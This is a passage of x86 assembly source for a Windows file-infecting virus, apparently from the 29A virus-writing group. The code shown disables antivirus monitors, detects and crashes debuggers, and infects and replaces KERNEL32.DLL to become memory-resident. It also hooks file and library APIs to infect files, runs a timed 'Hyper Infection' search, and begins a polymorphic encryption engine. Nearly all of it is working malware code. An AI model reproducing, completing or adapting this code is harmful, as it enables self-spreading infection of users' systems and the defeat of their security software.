			;     ECX ... number of bytes to read
			;     EDX ... destination buffer
			;     ESI ... file pos
			;     EBX ... file handle
			;   output:
			;     ECX ... number of reader bytes, CFlags

		call	__MySeekFile		;change file pos
		pusha
		xor	eax,eax
		push	ecx			;save for later using...
		push	eax			;support 2^64-2 bigger file ?
		lea	eax,[ebp+last_error]
		push	eax			;real readed bytes
		push	ecx
		push	edx
		push	ebx
		call	[ebp+ddReadFile]
		pop	[esp].access_ecx	;save old ECX to PUSHAD
		popa
		cmp	ecx,[ebp+last_error]
		jnz	$+3			;jump if STC, if not CLC :)
		test	al,0F9h 		;hidden STC instruction
		mov	ecx,[ebp+last_error]
		ret

__MyWriteFile:		; write some bytes (ECX) to certain filepos (ESI)
			; from buffer (EDX) by handle (EBX)
			;   input:
			;     ECX ... number of bytes to write
			;     EDX ... source buffer
			;     ESI ... file pos
			;     EBX ... file handle

		call	__MySeekFile
		pusha
		xor	eax,eax
		push	ecx			;save for later using...
		push	eax			;file bigger then 2^64-2 ?
		lea	eax,[ebp+last_error]
		push	eax
		push	ecx			;number of bytes to write
		push	edx			;source buffer
		push	ebx			;file handle
		call	[ebp+ddWriteFile]
		pop	[esp].access_ecx
		popa
		cmp	ecx,[ebp+last_error]
		jnz	$+3			;jump if STC, if not CLC :)
		test	al,0F9h 		;hidden STC instruction
		mov	ecx,[ebp+last_error]
		ret

__MySeekFile:		; seek in the file
			;   input:
			;     ESI ... new file pos
			;     EBX ... file handle

		pusha
		xor	eax,eax
		push	eax			;FILE_BEGIN defined in "WinBase.H"
		push	eax			;support 2^64-2 file size ?
		push	esi			;new file size
		push	ebx			;file handle
		call	[ebp+ddSetFilePointer]
		popa
		ret

__MySetAttrFile:	; change file attributes
			;   input:
			;     ECX ... new file attributes
			;     EDX ... file name pointer

		pusha
		push	ecx			;new attributes
		push	edx			;file name pointer
		call	[ebp+ddSetFileAttributesA]
		mov	[esp].access_eax,eax
		popa
		or	eax,eax
		jz	$+3
		test	al,0F9h 		;hidden STC instruction
		ret

__MyCloseFile:		; close (EBX) file handle

		pusha
		push	ebx			;handle to close
		call	[ebp+ddCloseHandle]
		popa
		ret

__MyGetFileSize:	; get file size
			;   input:
			;     EBX ... file handle

		pusha
		push	00000000h		;file bigger then 2^64-2 ?
		push	ebx			;file handle
		call	[ebp+ddGetFileSize]
		mov	[esp].access_eax,eax
		popa
		cmp	eax,-1
		jz	$+3
		test	al,0F8h 		;hidden STC instruction
		ret

__MyFindFirst:		; search certain file
			;   input:
			;     EDX ... file mask
			;     ESI ... dta
			;   output:
			;     EAX ... handle, CF status

		pusha
		push	esi			;output dta
		push	edx			;file mask
		call	[ebp+ddFindFirstFileA]
		mov	[esp].access_eax,eax
		popa
		cmp	eax,-1			;were we successful ?
		jz	$+3
		test	al,0F9h 		;hidden STC instruction
		ret

__MyFindNext:		; find next file
			;   input:
			;     EAX ... handle
			;     ESI ... dta

		pusha
		push	esi			;output dta
		push	eax			;FindFirstFile handle
		call	[ebp+ddFindNextFileA]
		or	eax,eax 		;success ?
		popa
		jz	$+3
		test	al,0F9h 		;hidden STC instruction
		ret

__MyFindClose:		; close file searcher
			;   input:
			;     EAX ... handle

		pusha
		push	eax			;FindFirstFile handle
		call	[ebp+ddFindClose]
		mov	[esp].access_eax,eax
		popa
		or	eax,eax 		;success ?
		jz	$+3
		test	al,0F9h 		;hidden STC instruction
		ret


malloc: 		; allocate memory (EAX)

		pusha
		mov	ebx,eax
		push	00000000h		;name of mapping object
		push	eax			;low 32 bits of object size
		push	00000000h		;high 32 bits of object size
		push	PAGE_READWRITE
		push	00000000h		;optional security attributes
		push	-1			;no file, only shared memory
		call	[ebp+ddCreateFileMappingA]
		or	eax,eax
		jz	__malloc_failed 	;success ?

		push	ebx			;number of bytes to map
		push	00000000h		;low 32 bits of file offset
		push	00000000h		;high 32 bits of file offset
		push	FILE_MAP_WRITE		;access mode
		push	eax			;mapped object
		call	[ebp+ddMapViewOfFile]

	__malloc_failed:
		mov	[esp].access_eax,eax	;memory address or NULL
		popa
		or	eax,eax
		ret

mdealloc:		; deallocate memory (EAX)

		pusha
		push	eax			;mapped address
		call	[ebp+ddUnmapViewOfFile]
		popa
		ret

__MyCreateThread:	; create thread
			;   input:
			;     EAX ... thread function
			;     EBX ... parameter
			;   output:
			;     EAX ... thread handle

		pusha
		call	$+9			;thread identifier
		dd	?
		push	00000000h		;create flags
	__mct_continue:
		push	ebx			;parameter
		push	eax			;start address
		push	00000000h		;stack size
		push	00000000h		;security attributes
		call	[ebp+ddCreateThread]
		mov	[esp].access_eax,eax	;EAX through POPA :)
		popa
		or	eax,eax
		jz	$+3
		test	al,0F9h 		;hidden STC instruction
		ret

;ÄÄÄ´ function to get kernel's address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function searchs functions in:
		;    * KERNEL32.DLL, USER32.DLL, ADVAPI32.DLL
		;At first I'll open library, get export table, RVA ... and
		;then I'll compare CRC32 with function names.
		;
		__fk32_inside	dd	00000000h	;library tables
		;

find_kernel32:
		mov	eax,[esp+8]		;I need kernel's address
		and	eax,0FFFF0000h
		add	eax,65536
    __scanning: sub	eax,65536
		cmp	word ptr [eax],'ZM'
		jnz	__scanning
		pusha
		mov	[ebp+kernel_base],eax
		mov	edx,eax

		; kernel's base 'MZ' address in EAX
		mov	ebx,eax
		add	eax,[eax+3ch]
		add	ebx,[eax+78h]
		mov	[ebp+__fk32_inside],ebx

		; search functions from "k32.dll, user32.dll, advapi32.dll"
		lea	ebx,[ebp+FunctionNames]
		lea	edi,[ebp+FunctionAddresses]
		mov	ecx,00000003h
	__fk32_next_library:
		push	ecx			;number of libraries
	__fk32_next_function:
		mov	esi,[ebx]		;get function's CRC32
		mov	[ebp+__sET_crc32],esi
		call	__searchET
		stosd				;write its address
		add	ebx,00000004h		;next CRC32 value
		cmp	dword ptr [ebx],00000000h ;end of functions
		jnz	__fk32_next_function	  ;of current library ?
		add	ebx,00000005h		;now, library name
		movzx	ecx,byte ptr [ebx-1]	;EAX ... length of library
		or	ecx,ecx
		jz	__fk32_finish

		push	ebx ebx 		;library name
		add	[esp+00000004h],ecx
		call	[ebp+ddLoadLibraryA]
		mov	ecx,-2			;libraries without k32
		add	ecx,[esp+00000004h]	;get number of libraries
		mov	[ebp+user32_base+ecx*4],eax
		mov	ebx,eax 		;start of file header
		mov	edx,eax
		add	eax,[eax+3ch]
		add	ebx,[eax+78h]
		mov	[ebp+__fk32_inside],ebx
		pop	ebx			;function names

		; next library ?
	__fk32_finish:
		pop	ecx
		loop	__fk32_next_library

		popa				;bye, bye K32, U32, A32...
		ret				;what a pleasure work with u!

		; search function's address
	__searchET:
		pusha
		mov	ebx,[ebp+__fk32_inside]
		mov	ecx,[ebx+32]		;search export table of
		add	ecx,edx 		;KERNEL32, searching
	__sET_next:
		mov	esi,[ecx]		;the names, then the ordinal
		add	esi,edx 		;and, finally the RVA pointerz
		call	__get_CRC32		;get name's CRC32 :)
		mov	edi,12345678h
	__sET_crc32 equ dword ptr $-4
		cmp	eax,edi 		;compare CRC32
		jz	__sET_found
		add	ecx,00000004h
		jmp	__sET_next
	__sET_found:
		sub	ecx,[ebx+32]
		sub	ecx,edx
		shr	ecx,1
		add	ecx,[ebx+36]
		add	ecx,edx
		movzx	ecx,word ptr [ecx]
		shl	ecx,2
		add	ecx,[ebx+28]
		add	ecx,edx
		mov	ecx,[ecx]
		add	ecx,edx
		mov	[esp].access_eax,ecx	;ehm, save ECX through POPA
		popa
		ret

;ÄÄÄ´ search fixed, cd-rom, ram-disk, etc. ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This  function  gets  information  about  disks.  I  call
		;GetDriveType function	to get type  of disk. You can  use
		;Win32API Help to know more  or WinBase.H (CBuilder, MSVC)
		;where you can see more flagz and their valuez. So, I  can
		;use GetLogicalDrives function, but that's one.
		;
get_disks:

		pusha
		xor	ebx,ebx
		mov	byte ptr [ebp+__disk],'A'

		; GetDriveType function...
	__gd_search:
		lea	eax,[ebp+__disk]
		push	eax
		mov	eax,[ebp+ddGetDriveTypeA]
		call	eax

		cmp	eax,00000003h		;DISK_FIXED flag
		jz	__gd_found

	__gd_new_disk:
		cmp	byte ptr [ebp+__disk],'Z'
		jz	__gd_finish
		inc	byte ptr [ebp+__disk]
		jmp	__gd_search

	__gd_found:
		mov	cl,'A'
		sub	cl,byte ptr [ebp+__disk]
		neg	cl
		mov	eax,00000001h
		shl	eax,cl			;convert to BCD
		or	ebx,eax
		jmp	__gd_new_disk

	__gd_finish:
		mov	[ebp+gdt_flags],ebx
		popa
		ret

	__disk:
		db	'A:\',0

;ÄÄÄ´ function to kill some AV monitors ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This is very interesting function how to send message	to
		;AV monitor to kill itself (AVP, AMON, AVG, AVAST monitor)
		;
kill_av_monitors:

		lea	esi,[ebp+kill_AV]	;address of strings
		xor	edi,edi
		mov	ecx,kill_AV_num 	;three monitors
	__kam_checking:
		push	ecx			;save counter
		push	esi			;AV string
		push	edi			;NULL
		call	[ebp+ddFindWindowA]
		test	eax,eax 		;found ?
		je	__kam_next_monitor
		push	edi			;send message to AV monitor
		push	edi			;to kill itself :)
		push	00000012h
		push	eax
		call	[ebp+ddPostMessageA]	;kill it, hehe :)
	__kam_next_monitor:
		@endsz				;next monitor
		pop	ecx
		loop	__kam_checking
		ret

;ÄÄÄ´ function to kill some debuggers ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function checks whether some debuggers are active.
		;I use these methods:
		;   * IsDebuggerPresent, kill SoftICE, kill TD32, etc.
		;
		;this code has been stolen from Benny's source, hi Benny :)
		;
kill_debuggers:

		; check standard debugger
		mov	eax,[ebp+ddIsDebuggerPresent]
	IFNDEF DEBUG
		call	eax			;check debug...
		or	eax,eax
		jnz	__kd_found
	ENDIF

		; check whether SoftICE 95/98/NT/2000 is active
		lea	edx,[ebp+kill_SoftICE]
		call	__MyOpenFile
		jnc	__kd_found
		lea	edx,[ebp+kill_SoftICE_NT]
		call	__MyOpenFile
		jnc	__kd_found

		; check others debuggers
		mov	eax,fs:[20h]
		or	eax,eax
	IFNDEF DEBUG
		jnz	__kd_found
	ENDIF
		ret

	__kd_found:
		xor	esp,esp 		;im sorry :)
		ret

;ÄÄÄ´ function to infect KERNEL32.DLL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function have to infect "KERNEL32.DLL" to this virus
		;become memory resident.
		;
		;I would like to thank;
		;   * Lord Julus/29A for his article about this in VxTasy.
		;
		__ik_system	dd	00000000h	;system directory
		__ik_window	dd	00000000h	;window directory
		__ik_wininit	db	'\WININIT.INI',0
		__ik_nul	db	'NUL',0
		__ik_rename	db	'Rename',0	;section name
		;
infect_kernel:

		; allocate memory for SYSTEM and WINDOWS directory
		mov	eax,filename_size
		call	malloc
		mov	[ebp+__ik_system],eax
		mov	eax,filename_size
		call	malloc
		mov	[ebp+__ik_window],eax

		; find SYSTEM directory
		push	filename_size
		push	[ebp+__ik_system]
		call	[ebp+ddGetSystemDirectoryA]

		; find WINDOWS directory
		push	filename_size
		push	[ebp+__ik_window]
		call	[ebp+ddGetWindowsDirectoryA]

		; copy \WINDOWS\SYSTEM + \KERNEL32.DLL
		lea	eax,[ebp+kernel_name]
		push	eax eax
		push	[ebp+__ik_system]
		call	[ebp+ddlstrcat]

		; copy \WINDOWS + \KERNEL32.DLL
		push	[ebp+__ik_window]
		call	[ebp+ddlstrcat]

		; copy KERNEL32.DLL from SYSTEM directory to '..'
		push	00000000h		;rewrite it
		push	[ebp+__ik_window]	;new filepath
		push	[ebp+__ik_system]	;actual filename
		call	[ebp+ddCopyFileA]
		or	eax,eax 		;if error, we're probably
		jz	__ik_fault		;in memory :)

		mov	eax,[ebp+__ik_window]
		mov	[ebp+filename_ptr],eax
		mov	[ebp+it_is_kernel],01h	;infect kernel flag
		call	infect_file

		; check system version Win9X or WinNT/2k ?
		call	[ebp+ddGetVersion]
		bt	eax,3Fh 		;get last bit
		jnc	__ik_nt2k		;jump if WinNT/2k
		push	[ebp+__ik_window]
		call	[ebp+ddlstrlen]
		xchg	edi,eax
		inc	edi
		push	filename_size
		push	[ebp+__ik_window]
		add	[esp],edi
		call	[ebp+ddGetWindowsDirectoryA]
		lea	eax,[ebp+__ik_wininit]	;wininit file name
		push	eax
		push	[ebp+__ik_window]
		add	[esp],edi
		call	[ebp+ddlstrcat] 	;window_dir + wininit

		; create WININIT.INI file and update one !
		push	[ebp+__ik_window]
		add	[esp],edi
		push	[ebp+__ik_system]	;existing KERNEL32.DLL
		lea	eax,[ebp+__ik_nul]
		push	eax
		lea	eax,[ebp+__ik_rename]
		push	eax
		call	[ebp+ddWritePrivatePFStringA]

		; build the rename INI instruction
		push	[ebp+__ik_window]	;wininit path
		add	[esp],edi
		push	[ebp+__ik_window]	;infected/old k32
		push	[ebp+__ik_system]	;new k32 path
		lea	eax,[ebp+__ik_rename]	;rename section
		push	eax
		call	[ebp+ddWritePrivatePFStringA]
		jmp	__ik_fault
	__ik_nt2k:
		push	00000005h		;after reboot, replace
		push	[ebp+__ik_system]	;new k32 path
		push	[ebp+__ik_window]	;old k32 path
		call	[ebp+ddMoveFileExA]

	__ik_fault:
		mov	eax,[ebp+__ik_window]
		call	mdealloc
		mov	eax,[ebp+__ik_system]
		call	mdealloc
		mov	[ebp+it_is_kernel],00h
		ret

;ÄÄÄ´ hooked functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

myCreateFileW:	      db 0E8h,hookInfectFile-$-3,0,0,0,68h,?,?,?,?,0C3h
myCreateFileA:	      db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h
myOpenFile:	      db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h
my_lopen:	      db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h

myCopyFileW:	      db 0E8h,hookInfectFile-$-3,0,0,0,68h,?,?,?,?,0C3h
myCopyFileA:	      db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h
myMoveFileW:	      db 0E8h,hookInfectFile-$-3,0,0,0,68h,?,?,?,?,0C3h
myMoveFileA:	      db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h
myMoveFileExW:	      db 0E8h,hookInfectFile-$-3,0,0,0,68h,?,?,?,?,0C3h
myMoveFileExA:	      db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h

myLoadLibraryW	      db 0E8h,hookInfectFile-$-3,0,0,0,68h,?,?,?,?,0C3h
myLoadLibraryA:       db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h
myLoadLibraryExW:     db 0E8h,hookInfectFile-$-3,0,0,0,68h,?,?,?,?,0C3h
myLoadLibraryExA:     db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h
myFreeLibrary:	      db 0E8h,hookInfectFile-$-4,0,0,0,68h,?,?,?,?,0C3h

EndOfNewFunctions	equ	this byte

;ÄÄÄ´ common hooked functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function is runned from kernel32 file, first time do
		;    * clear some valuez, bufferz
		;    * delete files in \TEMP\ (droppers)
		;    * create "already resident" flag (mutex)
		;    * inicialize "Hyper Infection" (SetTimer)
		;    * create a crypto thread
		;    * get actual process ID
		;Then if I'll catch "FreeLibrary" function, I'll do:
		;    * call "crypto_get_library" (more info there)
		;And If I'll catch "LoadLibrary, CreateFile, ..." function
		;    * is it a DLL file
		;    * call "crypto_thread" by CT_DECRYPTFILE flag
		;
		;We might say this function is the most important in virus
		;many problems were here.
		;
hookInfectFile:

		; prepare for UniCode functions
		test	al,0F9h 		;hidden STC instruction

	IFDEF DEBUG				;my SoftICE breakpoint
		int	4			;many battles were here
	ENDIF

		pusha				;save all registers
		pushf				;save all flags
		pushf
		call	get_base_ebp		;get delta offset
		popf
		jnc	__hif_no_stop		;ansi version
		call	unicode2ansi
		jz	__hif_finish		;no bytes converted ?
		jmp	__hif_continue

		; test whether "Prizzy Hyper Infection" has been actived...
	__hif_no_stop:
		cmp	dword ptr [ebp+HyperInfection_k32],00000000h
		jnz	__hif_continue
		call	clear_valuez		;clear archive structures
		call	clear_temp_droppers	;delete temp file trom \TEMP\
		call	create_mutex		;already resident
		call	hookHyperInfection	;inicialize "HyperInfection"
		lea	eax,[ebp+crypt_thread]	;create common crypt thread
		mov	ebx,ebp 		;...and its parameter
		call	__MyCreateThread
		mov	[ebp+crypto_mainThread],eax
		call	[ebp+ddGetCurrentProcessId] ;get process ID number
		mov	[ebp+crypto_mainProcId],eax
		mov	[ebp+crypto_thread],CT_LOADKEY	;load cryptography
		mov	[ebp+crypto_thread_err],'!A92'	;key and wait then
	__hif_crLoadKey:
		push	50			;active thread to load crypto
		push	[ebp+crypto_mainThread] ;key
		call	[ebp+ddWaitForSingleObject]
		cmp	[ebp+crypto_thread_err],'!A92'
		jz	__hif_crLoadKey

		; which type of function is called ?
	__hif_continue:
		lea	eax,[ebp+myCreateFileW] ;start of table
		sub	eax,[esp+00000024h]	;return address
		neg	eax
		sub	eax,00000005h		; - call instruction
		mov	ebx,(offset myCreateFileA - offset myCreateFileW)
		cdq
		div	ebx			;get number of function
		cmp	ax,000Eh		;FreeLibrary ?
		jz	crypt_get_library

		; get filename length
	__hif_get_flen:
		mov	esi,[esp+0000002Ch]	;get file name
		push	esi
		call	[ebp+ddlstrlen] 	;not including null terminator
		or	eax,eax 		;zero length
		jz	__hif_finish
		inc	eax			; + zero char

		; copy filename to the buffer
		lea	edi,[ebp+filename]	;destination buffer
		mov	[ebp+filename_ptr],edi
		mov	ecx,eax 		;filename length
		rep	movsb

		; upcase characters
		push	eax			;number of characters
		push	[ebp+filename_ptr]	;filename
		call	[ebp+ddCharUpperBuffA]	;convert to uppercase

		; CreateFile, OpenFile, CopyFile, MoveFile, ...
		lea	esi,[ebp+filename]	;find the end of filename
		mov	[ebp+filename_ptr],esi
		@endsz				;ehm :)

		; use crypto thread to decrypt file
		cmp	[esi-5],'LLD.'		;DLL file ?
		jnz	__hif_finish		;or not ?
		cmp	[ebp+crypto_thread_err],'!A92'
		jz	__hif_finish		;other process ?
		mov	[ebp+crypto_thread],CT_DECRYPTFILE
		mov	[ebp+crypto_thread_err],'!A92'
		push	[ebp+crypto_mainProcId] ;active the process where I
		push	00000000h		;created my thread, I can't
		push	00000001h		;call thread for other pro-
		call	[ebp+ddOpenProcess]	;cess, so I have to active
		push	eax			;its and then go back, mul-
	__hif_cDecryptFile:			;titasking world !!!
		push	50
		push	dword ptr [esp+00000004h]
		call	[ebp+ddWaitForSingleObject]
		cmp	[ebp+crypto_thread_err],'!A92'
		jz	__hif_cDecryptFile	;crypto thread must decrypt
		call	[ebp+ddCloseHandle]	;in stack is its handle

	__hif_finish:
		popf
		popa
		ret

;ÄÄÄ´ start HyperInfection inside KERNEL32.DLL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;Before then I will start I must load "USER32", "ADVAPI32"
		;libraries and	re-write all my function offsets. I do NOT
		;exactly know whether it  must be but when I'll load these
		;libraries sometimes later I should get  other offset then
		;after 1st running. Next, I must  install  timer on "Hyper
		;Infection" function.
		;
hookHyperInfection:

		; load "USER32.DLL" library
		lea	eax,[ebp+user32_name]	;library name
		call	[ebp+ddLoadLibraryA], eax
		or	eax,eax 		;failed ?
		jz	__hhi_finish
		mov	ebx,eax

		; load "ADVAPI32.DLL" library
		lea	eax,[ebp+advapi32_name] ;library name
		call	[ebp+ddLoadLibraryA], eax
		or	eax,eax 		;failed ?
		jz	__hhi_finish

		; decrease/increase function bases
		cmp	dword ptr [ebp+crypto_Action],00000000h
		jz	__hhi_no_cryptography
		sub	eax,[ebp+advapi_base]	;new memory position
		mov	ecx,(HookedAddresses_user32 - \
			     HookedAddresses_advapi32) / 4
		lea	esi,[ebp+HookedAddresses_advapi32]
	__hhi_modify_advapi32:
		add	[esi],eax
		loop	__hhi_modify_advapi32
	__hhi_no_cryptography:
		sub	ebx,[ebp+user32_base]	;new memory position
		mov	ecx,(FunctionNames - HookedAddresses_user32) / 4
	__hhi_modify_user32:
		add	[esi],ebx
		loop	__hhi_modify_user32

		; set timer to the Prizzy Hyper Infection for API, "PHI-API"
		lea	eax,[ebp+init_search]	;main function
		push	eax
		push	3000			;every 3 seconds :)
		push	00000000h		;timer identifier
		push	00000000h		;hwnd
		call	[ebp+ddSetTimer]
		or	eax,eax
		jz	__hhi_finish

		mov	[ebp+HyperInfection_timerID],eax
		mov	byte ptr [ebp+search_start],00h  ;PHI didnt begin

	__hhi_finish:
		mov	dword ptr [ebp+HyperInfection_k32],00000001h
		ret

;ÄÄÄ´ finish HyperInfection inside KERNEL32.DLL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

hookHyperInfection_Done:

		; remove timer
		push	dword ptr [ebp+HyperInfection_timerID]
		call	[ebp+ddKillTimer]
		ret

;ÄÄÄ´ common standard functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;After every start  of windows I compress some programs to
		;TEMP directory (usually four new achives). And every win-
		;dows run I have to delete them.
		;
		__ctd_memory	dd	00000000h	;place in memory
		__ctd_fmask	db	'29A*.TMP',0	;file mask
		__ctd_fmask_len equ this byte - __ctd_fmask
		;
clear_temp_droppers:

		; allocate moemory for TEMP directory
		mov	eax,filename_size
		call	malloc
		mov	[ebp+__ctd_memory],eax

		; get two TEMP directory
		push	eax			;outta buffer
		push	filename_size
		call	[ebp+ddGetTempPathA]
		or	eax,eax 		;give me filepath length
		jz	__ctd_dealloc

		; copy filemask in the end of filename
		lea	esi,[ebp+__ctd_fmask]	;file mask
		mov	edi,[ebp+__ctd_memory]	;outta buffer
		add	edi,eax 		; + length of dir name
		mov	ecx,__ctd_fmask_len	;length of file mask
		rep	movsb			;copy me, my lord :) !

		; search them
		mov	ebx,eax
		lea	esi,[ebp+dta]		;i can use "infect_file" dta
		mov	edx,[ebp+__ctd_memory]	;temp directory + file mask
		call	__MyFindFirst
		jc	__ctd_dealloc

		; delete file
	__ctd_next_file:
		push	eax			;find handle
		lea	esi,[ebp+dta.dta_filename]
		mov	edi,[ebp+__ctd_memory]
		add	edi,ebx 		; + length of dir name
		@copysz 			;ahhh, JQwerty's macro :)

		push	[ebp+__ctd_memory]	;filename
		call	[ebp+ddDeleteFileA]

		; search next file
		pop	eax			;find handle
		lea	esi,[ebp+dta]		;dta
		call	__MyFindNext
		jnc	__ctd_next_file

		; close find handle
		call	__MyFindClose		;find next file !

	__ctd_dealloc:
		mov	eax,[ebp+__ctd_memory]
		call	mdealloc
	__ctd_failed:
		ret

		;---------------------------------------------------------
		;Clear all archive structures, all droppers, all programs.
		;
clear_valuez:
		xor	eax,eax
		lea	edi,[ebp+NewArchive]
		mov	ecx,NewArchiveNum * (NewArchiveSize / 4)
		rep	stosd

		; set libraries memory, info
		mov	dword ptr [ebp+file_infected],00000000h
		mov	eax,100 * 4
		call	malloc
		mov	[ebp+crypto_library],eax
		mov	dword ptr [ebp+crypto_nLib],00000000h

		; clear HyperTable
		lea	esi,[ebp+HyperTable]
	__cv_repeat:
		lodsb				;name or extension or end ?
		cmp	al,0FFh
		jz	__cv_finish
		call	[ebp+ddlstrlen], esi	;get filename
		inc	eax			;zero char
		add	esi,eax
		mov	byte ptr [esi],00h	;search flag !
		add	esi,HyperTable_HalfSize
		jmp	__cv_repeat
	__cv_finish:
		ret

		;---------------------------------------------------------
		;Convert Unicode filename to Ansi version.
		;
unicode2ansi:

		lea	eax,[esp+00000034h]	;UniCode filename
		lea	ebx,[ebp+filename]
		push	00000000h		;don't tell me about problem
		push	00000000h		;ignore unmappable characters
		push	MAX_PATH		;how many bytes to allocate
		push	ebx			;destination buffer
		push	-1			;calculate strlen(string)+1
		push	eax			;filename in unicode
		push	00000000h		;no composite characters
		push	CP_ACP
		call	[ebp+ddWideCharToMultiByte]
		or	eax,eax
		ret

		;---------------------------------------------------------
		;Create mutex or get "already resident" flag.
		;
		;  output: (C)arry flag
		;
create_mutex:
		pusha
		lea	eax,[ebp+crypto_mutex]	;mutex name
		push	eax
		push	00000001h		;owner
		push	00000000h		;mutex attributes
		call	[ebp+ddCreateMutexA]
		push	eax
		call	[ebp+ddGetLastError]	;already resident ?
		mov	ebx,eax
		or	ebx,ebx
		jz	__cm_finish
		call	[ebp+ddReleaseMutex]
		push	eax
	__cm_finish:
		pop	eax
		mov	[esp].access_eax,ebx
		or	ebx,ebx 		;already resident ?
		jnz	__cm_failed
		test	al,0F9h 		;hidden STC instruction
	__cm_failed equ $-1
		popa
		ret

;ÄÄÄ´ getting address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;Get delta offset to EBP. The second SUB instruction sub-
		;tract "virus_start". So then I can only use:
		;     *  LEA   EAX,[EBP+pe_header]
		;instead
		;     *  LEA   EAX,[EBP+pe_header - virus_start]
		;

get_base_ebp:					;get address where we're
		call	$+5
		pop	ebp
		sub	ebp,$-1-virus_start
		sub	ebp,offset virus_start
		ret

;ÄÄÄ´ Prizzy Polymorphic Engine II (PPE-II) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function generate polymorphic engine with:
		;    * brute-attack algorithm
		;    * random multi-layer engine
		;Please find "ppe_*" functions to know more, thanks.
		;
		;
		__ppe_st_flags	 dw	?	;input of tbl_encode_loop
		__ppe_st_items	 db	?	;items in table
		__ppe_st_o_table dd	?	;offset to the table (part)
		;
ppe_startup:

		; save all registers
		pusha

		; clear tables of (base-register / garbages / JNZ ... )
		mov	byte  ptr [ebp+used_regs      ],00h
		mov	byte  ptr [ebp+recursive_level],00h
		mov	byte  ptr [ebp+compare_index  ],00h
		mov	byte  ptr [ebp+gl_index_reg   ],-1
		mov	dword ptr [ebp+__pllg_memory  ],00000000h

		; set style of garbages (based+flags)
		mov	byte  ptr [ebp+garbage_style  ],not USED_FLAGS

		; copy virus body to the allocated memory
		lea	esi,[ebp+virus_start]
		mov	edi,[ebp+mem_address]
		mov	ecx,file_size
		rep	movsb

		; clear two SoftICE final breakpoints
		mov	eax,[ebp+mem_address]
		mov	word ptr [eax+__final_SoftICE_1-virus_start],9090h
		mov	word ptr [eax+__final_SoftICE_2-virus_start],9090h

		; load address of the start of poly-decoder
		mov	edi,[ebp+poly_start]

		; clear table
		xor	ebx,ebx
		mov	ecx,00000005h
		lea	esi,[ebp+tbl_encode_loop]
	__ppes_clear_table:
		lodsw
	__ppes_clear_item:
		mov	dword ptr [esi],ebx
		add	esi,00000008h
		dec	al
		jnz	__ppes_clear_item
		dec	ecx
		jnz	__ppes_clear_table

		; get global_index_reg
		call	ppe_get_empty_reg
		call	__reg_to_bcd
		mov	[ebp+gl_index_reg2],al
		or	[ebp+used_regs],ah

		; get index_reg --> (xor,sub...) [index_reg], reg32
	__ppes_new_ireg:
		call	ppe_get_empty_reg
		cmp	al,00000101b		;EBP isn't supported
		jz	__ppes_new_ireg
		call	__reg_to_bcd
		mov	[ebp+index_reg],al
		or	[ebp+used_regs],ah

		; get code reg --> (xor,sub...) [---], code_reg
	__ppes_new_creg:
		call	ppe_get_empty_reg
		test	al,00000100b		;only 8 bits reg
		jnz	__ppes_new_creg
		call	__reg_to_bcd
		mov	[ebp+code_reg],al
		or	[ebp+used_regs],ah

		; get mlayer pointer --> mov reg8, [gl_index_reg+mpointer]
	__ppes_new_lreg:
		call	ppe_get_empty_reg
		cmp	al,00000101b		;EBP isn't supported
		jz	__ppes_new_lreg
		mov	[ebp+mlayer_reg],al

		; generate initial code value
		call	ppe_get_rnd32
		mov	[ebp+code_value],eax
		call	ppe_get_rnd32
		mov	[ebp+code_value_add],eax

		; select style (add/sub/xor)
		mov	eax,00000003h
		call	ppe_get_rnd_range
		mov	[ebp+crypt_style],al

		; clear used registers (this isn't right time)
		mov	byte ptr [ebp+used_regs],00h

		; choose subroutine
		xor	ebx,ebx
		mov	ecx,00000005h
		lea	esi,[ebp+tbl_encode_loop]
	__ppes_choose:
		lodsw				;AH=random?, AL=items
		mov	[ebp+__ppe_st_flags  ],ax
		mov	[ebp+__ppe_st_items  ],al
		mov	[ebp+__ppe_st_o_table],esi
		or	ah,ah			;random ? JZ if not
		jnz	__ppes_crun
	__ppes_cnext:
		mov	esi,[ebp+__ppe_st_o_table]
